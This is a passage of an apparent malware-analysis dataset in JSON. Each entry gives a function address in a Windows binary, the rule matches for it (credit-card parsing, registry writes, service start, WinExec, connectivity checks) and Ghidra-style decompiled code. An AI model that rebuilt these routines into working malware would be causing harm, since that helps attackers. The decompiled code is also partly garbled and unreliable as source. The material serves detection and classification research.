            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404de0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x41e888 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004025e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402400(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1869
    },
    "004035e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004035e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar2 = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        iVar3 = 1;\n        do {\n            uVar1 = *(iVar3 % arg_ch + arg_8h);\n            *(arg_18h + -1 + iVar3) = uVar2 ^ *(var_8h + arg_10h) ^ *((iVar3 + -1) % arg_ch + arg_8h);\n            *(iVar3 + arg_18h) = uVar2 ^ uVar1;\n            var_8h = var_8h + 1;\n            iVar3 = iVar3 + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "00403bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403bb0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404aa0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x41e840;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "00404150": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404205) overlaps instruction at (ram,0x00404203)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00404150(int32_t *hWnd)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    char cVar9;\n    uint *puVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t extraout_ECX;\n    int32_t iVar10;\n    char *pcVar11;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    bool bVar12;\n    uint8_t in_AF;\n    ulong uVar13;\n    uint32_t uVar14;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    uint *hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    uint32_t uVar3;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4051d0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00404150::var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    puVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (puVar4 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    hLibModule = puVar4;\n    uVar5 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    bVar12 = (POPCOUNT((unaff_EDI & uVar5) + 0xaf70 & 0xc) & 1U) == 0;\n    uVar14 = 0x4041ee;\n    uVar13 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar5, 0, 0, 2, 1000, &fcn.00404150::lpdwResult);\n    pcVar11 = uVar13 >> 0x20;\n    iVar7 = uVar13;\n    if ((bVar12) || (uVar14 = uVar14 & 0xffff | puVar4 << 0x10,  !bVar12)) {\n        uVar14 = 0x407418;\n    }\n    else {\n        out(*puVar4, uVar13 >> 0x20);\n        do {\n            cVar9 = iVar7 >> 8;\n            in_AF = 9 < (iVar7 & 0xf) | in_AF;\n            iVar7 = CONCAT31(CONCAT21(iVar7 >> 0x10, cVar9 - in_AF), -in_AF);\n        } while (in_AF || cVar9 == *pcVar11);\n        puVar1 = unaff_EDI + pcVar11 * 2;\n        uVar2 = *puVar1;\n        uVar3 = *puVar1;\n        *puVar1 = (uVar3 + 0x7b) - in_AF;\n        *(extraout_ECX + 0x68) = iVar7;\n        *(iVar7 * 3) = (*(iVar7 * 3) - (uVar13 >> 0x28)) - (uVar2 < 0xffffff85 || uVar3 + 0x7b < in_AF);\n        puVar4 = puVar4 + 1;\n    }\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar4, uVar14);\n    if (pcVar6 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar7 = (*pcVar6)(lpdwResult, str._D_3, 0, &fcn.00404150::var_20h);\n    if ((iVar7 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar7 = (**(*var_20h + 0x20))(var_20h, &fcn.00404150::var_24h);\n        if ((-1 < iVar7) && (var_24h != NULL)) {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &fcn.00404150::var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar7 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &fcn.00404150::hWnd);\n                    if ((iVar7 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x0040458f:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x0040459b:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&fcn.00404150::var_34h);\n                        break;\n                    }\n                    iVar7 = (***hWnd)(hWnd, 0x4061b0, &fcn.00404150::var_10h);\n                    if (((iVar7 < 0) || (var_10h == NULL)) ||\n                       (iVar7 = (**(*var_10h + 0x38))(var_10h, &fcn.00404150::pbstr),  iVar7 < 0)) {\njoined_r0x00404556:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x0040459b;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00404392:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403f60(pbstr, &fcn.00404150::var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar8 = (*_sym.imp.MSVCRT.dll__stricmp)(&fcn.00404150::var_24ch, 0x40742c);\n                        if (iVar8 != 0) goto joined_r0x00404392;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar7 = (***hWnd)(hWnd, 0x4061a0, &fcn.00404150::var_14h);\n                        if ((iVar7 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040453b:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x0040458f;\n                        }\n                        iVar7 = (**(*var_14h + 0x20))(var_14h, &fcn.00404150::var_3ch);\n                        iVar8 = var_3ch;\n                        if (iVar7 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040453b;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar4 = &fcn.00404150::var_147h;\n                            for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {\n                                *puVar4 = 0;\n                                puVar4 = puVar4 + 1;\n                            }\n                            *puVar4 = 0;\n                            *(puVar4 + 2) = 0;\n                            fcn.00403f60(iVar8, &stack0xfffffeb4, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar8 = fcn.00404070(&stack0xfffffeb4);\n                            if (iVar8 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00404556;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&fcn.00404150::var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n        }\n        if (var_24h != NULL) {\n            var_4h = var_4h._1_3_ << 8;\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar7;\n}\n",
        "token_count": 2905
    },
    "004047c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404811) overlaps instruction at (ram,0x00404810)\n// \n// WARNING: Removing unreachable block (ram,0x004048ee)\n// WARNING: Removing unreachable block (ram,0x004048f7)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.004047c0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *unaff_EBX;\n    uint *puVar6;\n    bool bVar7;\n    uchar uVar8;\n    uint uVar9;\n    uchar var_260h;\n    uint var_25fh;\n    uchar var_15ch;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401f50();\n    uVar4 = fcn.00403f90();\n    bVar7 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 != 0) {\n        if ((bVar7) || (!bVar7)) {\n            unaff_EBX = NULL;\n        }\n        *unaff_EBX = *unaff_EBX ^ 0xffffffdb;\n        var_15ch = SUB41(unaff_EBX, 0);\n        puVar6 = &var_25fh;\n        for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        var_260h = var_15ch;\n        iVar5 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(unaff_EBX, &var_260h, 0x26, unaff_EBX);\n        if (iVar5 != 0) {\n            fcn.00402590();\n            puVar6 = &var_15bh;\n            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&var_15ch, 0x4073ac, *0x10 + -0x264, 0x738c, 3);\n            pcVar3 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar6 = &var_58h;\n                for (iVar5 = 0x11; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                var_28h._0_2_ = 0;\n                var_10h = NULL;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                uVar9 = 0;\n                iVar5 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &var_15ch, 0, 0, 0, 0, 0, 0, *0x10 + -0x5c, 0xec);\n                if (iVar5 == 0) {\n                    return;\n                }\n                (*pcVar2)(3000);\n                (*pcVar3)(fcn.004046a0, var_8h);\n                puVar6 = var_10h;\n                iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(var_10h, 1000);\n                uVar8 = SBORROW4(iVar5, 0x102);\n                if (iVar5 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(var_10h, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar8) && (uVar8)) {\n                    *puVar6 = uVar9;\n                    return;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar1)(var_10h);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1121
    },
    "00401180": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00401180(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00403410(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 261
    },
    "00401230": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040141b) overlaps instruction at (ram,0x00401419)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * fcn.00401230(int32_t param_1, uint *param_2, uint param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uchar **ppuVar3;\n    uint8_t uVar4;\n    char cVar6;\n    char *pcVar5;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uchar *puVar8;\n    char *pcVar9;\n    uint *puVar10;\n    int32_t *piVar11;\n    bool bVar12;\n    uint8_t in_AF;\n    bool bVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint uVar16;\n    uchar *puStack556;\n    uint uStack552;\n    uchar uStack536;\n    uint uStack535;\n    uchar uStack276;\n    uchar auStack275 [259];\n    uint uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    \n    uStack536 = 0;\n    puVar10 = &uStack535;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    uStack276 = 0;\n    puVar10 = auStack275;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    uStack16 = 1;\n    piVar11 = puVar10 + 3;\n    *(puVar10 + 2) = 0;\n    puStack556 = &uStack536;\n    uStack552 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276, 0x407030, &uStack536, param_1);\n    fcn.00402e30(&uStack8, &iStack12);\n    pcVar5 = fcn.00402770(param_1, param_2, param_3, param_4, uStack8, iStack12);\n    bVar12 = false;\n    bVar13 = pcVar5 == NULL;\n    iVar7 = extraout_ECX;\n    while( true ) {\n        if (bVar13) {\n            return pcVar5;\n        }\n        puVar8 = &stack0xfffffffc;\n        if ((bVar12) || (puVar8 = &stack0xfffffffc,  !bVar12)) break;\n        iVar7 = iVar7 + -1;\n        if (iVar7 == 0 || !bVar13) {\n            *piVar11 = param_2 + 1;\n            param_2 = 0x8bb8ec44;\n            iStack12 = iVar7;\n            puVar8 = &uStack8 + 3;\n            break;\n        }\n        uVar4 = pcVar5 + bVar12;\n        pcVar5 = pcVar5 & 0xffffff00 | uVar4;\n        puVar1 = param_1 + -0x3f7ae73c;\n        bVar12 = CARRY1(*puVar1, uVar4);\n        *puVar1 = *puVar1 + uVar4;\n        bVar13 = *puVar1 == 0;\n    }\n    iVar7 = fcn.004039b0(puVar8 + -0x110, *(puVar8 + -4), iStack12);\n    if (iVar7 == 0) {\n        return NULL;\n    }\n    fcn.00401180();\n    iVar7 = fcn.004021a0(0x407068);\n    if (iVar7 == -1) {\n        uVar14 = fcn.004021a0(0x40705c);\n        uVar2 = uVar14 + 1;\n        iVar7 = extraout_ECX_00;\n        if (uVar2 == 0) goto code_r0x00401404;\n        piVar11 = 0xf;\n    }\n    else {\n        piVar11 = 0xe;\n    }\n    uVar15 = fcn.00402320(param_1);\n    uVar14 = uVar15 & 0xffffffff00000000 | *0x41e884;\n    if (uVar15 != 0) {\n        fcn.00404db0(piVar11);\n        fcn.00403ae0(piVar11);\n        return 0x1;\n    }\n    iVar7 = extraout_ECX_01;\n    uVar2 = *0x41e884;\n    if (*0x41e884 == 0) {\n        return NULL;\n    }\ncode_r0x00401404:\n    pcVar5 = uVar14 >> 0x20;\n    uVar16 = uVar14;\n    bVar13 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if ((bVar13) && (!bVar13)) {\n        out(*param_2, uVar14 >> 0x20);\n        do {\n            cVar6 = uVar16 >> 8;\n            in_AF = 9 < (uVar16 & 0xf) | in_AF;\n            uVar16 = CONCAT31(CONCAT21(uVar16 >> 0x10, cVar6 - in_AF), -in_AF);\n        } while (in_AF || cVar6 == *pcVar5);\n        piVar11 = piVar11 + pcVar5 * 2;\n        *piVar11 = (*piVar11 + 0x7b) - in_AF;\n        *(iVar7 + -0x73) = uVar16;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar7 = fcn.004015a0(param_1, puVar8 + -0x110);\n    if (iVar7 == 0) {\n        *(puVar8 + -0xc) = 0;\n    }\n    pcVar5 = *(puVar8 + -0xc);\n    uVar16 = extraout_ECX_02;\n    if ((pcVar5 != NULL) && (pcVar5 = fcn.00402710(param_1),  uVar16 = extraout_ECX_03,  pcVar5 == NULL)) {\n        *(puVar8 + -0xc) = 0;\n    }\n    pcVar9 = *(puVar8 + -0xc);\n    if (*(puVar8 + -0xc) == NULL) {\n        pcVar5 = fcn.00401000(*(puVar8 + 8), 0);\n        *(puVar8 + -0xc) = pcVar5;\n        uVar16 = extraout_ECX_04;\n        pcVar9 = pcVar5;\n    }\n    ppuVar3 = pcVar9;\n    if (pcVar9 != NULL) {\n        pcVar5 = fcn.00403ae0(0xffffffff);\n        uVar16 = extraout_ECX_05;\n        ppuVar3 = &puStack556;\n    }\n    bVar13 = (POPCOUNT(ppuVar3 & 0xff) & 1U) == 0;\n    if ((bVar13) || (!bVar13)) {\n        uVar16 = 1000;\n    }\n    else {\n        *(pcVar5 + -0x18) = *(pcVar5 + -0x18) + -3;\n        *pcVar5 = *pcVar5 + pcVar5;\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(uVar16);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c, 0);\n    return pcVar9;\n}\n",
        "token_count": 1884
    },
    "00401510": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401510(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 256
    },
    "004015a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
